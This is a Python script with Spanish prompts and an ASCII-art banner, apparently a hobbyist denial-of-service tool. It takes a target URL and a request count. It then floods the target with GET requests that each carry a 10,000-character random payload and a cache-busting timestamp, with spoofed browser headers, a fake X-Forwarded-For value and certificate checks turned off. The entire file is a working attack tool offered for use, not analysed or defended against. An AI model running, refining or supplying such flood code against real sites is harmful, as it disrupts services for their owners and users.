# Este código utiliza la biblioteca de Python "requests" para hacer solicitudes HTTP.
# La biblioteca "requests" es propiedad de Kenneth Reitz y está bajo la licencia Apache 2.0.
import requests
import random
import string
import re
import sys
from time import time, sleep

def validar_url(url):
    url_regex = re.compile(
        r'^(?:http|ftp)s?://'
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
        r'localhost|'
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
        r'(?::\d+)?'
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

    if not re.match('(?:http|ftp)s?://', url):
        url = 'http://' + url

    if not url.endswith('/'):
        url += '/'

    if re.match(url_regex, url):
        return url
    else:
        return None

def inicializar():
    count = 0
    start_time = time()
    links = input("Ingresa el enlace: \n")
    max_requests = int(input("Ingrese la cantidad de peticiones: \n"))
    headers = {
        'Cache-Control': 'no-cache',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Referer': 'https://www.google.com/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Cookie': 'cookie_name=cookie_value; other_cookie_name=other_cookie_value',
        'X-Forwarded-For': '127.0.0.1',
        'X-Forwarded-Proto': 'https',
        'X-Requested-With': 'XMLHttpRequest',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
        'TE': 'Trailers',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer abcdef123456',
        'Origin': 'https://www.google.com/',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty'
    }
    link = validar_url(links)
    if link:
        print("La URL es válida:", link)
        print("Generando...")
    else:
        print("La URL ingresada es inválida, por favor ingresala nuevamente...")
        inicializar()
    try:
        for _ in range(max_requests):
        
            payload = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10000))
            try:
                requests.get(link + "?" + str(time()) + "&payload=" + payload, headers=headers, verify=False, timeout=5)
            except TypeError as e:
                print("Error: No se pudo enviar la solicitud!",e)
            count += 1
            if count == max_requests:
                break
            delay = random.uniform(0, 1)
            sleep(delay)
        elapsed_time = time() - start_time
        print(f"Completadas {count} solicitudes en {elapsed_time} segundos")
    except requests.exceptions.RequestException as e:
        print(f"Error durante la solicitud: {e}")
    print("1) Volver al menú")
    print("2) Salir")
    retorno = int(input("Ingrese la opción: "))
    if retorno == 1:
        main()
    else:
        sys.exit("Hasta luego")

def main():
    print("\n░██████╗░██╗░░░██╗███╗░░██╗░██████╗░███╗░░██╗██╗██████╗░")
    print("██╔════╝░██║░░░██║████╗░██║██╔════╝░████╗░██║██║██╔══██╗")
    print("██║░░██╗░██║░░░██║██╔██╗██║██║░░██╗░██╔██╗██║██║██████╔╝")
    print("██║░░╚██╗██║░░░██║██║╚████║██║░░╚██╗██║╚████║██║██╔══██╗")
    print("╚██████╔╝╚██████╔╝██║░╚███║╚██████╔╝██║░╚███║██║██║░░██║")
    print("░╚═════╝░░╚═════╝░╚═╝░░╚══╝░╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░╚═╝\n")
    print("Versión 1.0")
    print("Dᴇsᴀʀʀᴏʟʟᴀᴅᴏ ᴘᴏʀ 05513ʟ 😎")
    print("¡Estoy trabajando para mejorar el código! 😊")
    print("_______________________")
    inicializar()
main()
